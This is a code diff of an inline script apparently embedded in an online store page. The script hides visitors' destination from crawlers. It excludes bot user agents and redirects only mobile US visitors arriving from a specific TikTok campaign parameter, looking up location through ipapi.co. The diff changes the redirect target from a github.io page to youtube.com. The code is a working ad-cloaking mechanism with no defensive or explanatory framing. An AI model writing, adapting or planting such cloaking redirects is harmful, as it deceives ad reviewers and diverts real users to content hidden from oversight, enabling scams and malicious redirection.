@@ -6,47 +6,44 @@
     document.addEventListener("DOMContentLoaded", function() {
         var userAgent = navigator.userAgent;
 
-        // Função para verificar se o agente do usuário é um bot conhecido.
+        // Verificação de bot simplificada.
         function isBot() {
             return /bot|crawler|spider|crawling/i.test(userAgent);
         }
 
-        // Função para verificar se o dispositivo é móvel.
+        // Verificação de dispositivo móvel simplificada.
         function isMobile() {
             return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
         }
 
-        // Função para obter a localização geográfica do usuário.
-        function getGeolocation(callback) {
-            fetch('https://ipapi.co/json/')
-                .then(function(response) {
-                    return response.json();
-                })
-                .then(function(data) {
-                    callback(data);
-                })
-                .catch(function(error) {
-                    console.error('Erro ao obter geolocalização:', error);
-                    callback(null);
-                });
-        }
-
-        // Função para verificar se a URL contém os parâmetros específicos da campanha do TikTok.
+        // Verificação de parâmetros da URL simplificada.
         function isReferredFromTikTok() {
             var urlParams = new URLSearchParams(window.location.search);
             return urlParams.get('utm_id') === 'tiktokwmv';
         }
 
-        // Verifica se não é um bot, o dispositivo é móvel, a localização é nos Estados Unidos e a origem é TikTok.
+        // Obtenção rápida da localização geográfica do usuário.
+        function getGeolocation(callback) {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => callback(data))
+                .catch(error => {
+                    console.error('Erro ao obter geolocalização:', error);
+                    callback(null);
+                });
+        }
+
+        // Verificar todas as condições rapidamente e redirecionar.
         if (!isBot() && isMobile() && isReferredFromTikTok()) {
             getGeolocation(function(location) {
                 if (location && location.country_code === 'US') {
-                    window.location.href = "https://bill101521.github.io/endop/";
+                    window.location.href = "https://youtube.com";
                 }
             });
         }
     });
 </script>
+
     
     <script>
 window.KiwiSizing = window.KiwiSizing === undefined ? {} : window.KiwiSizing;
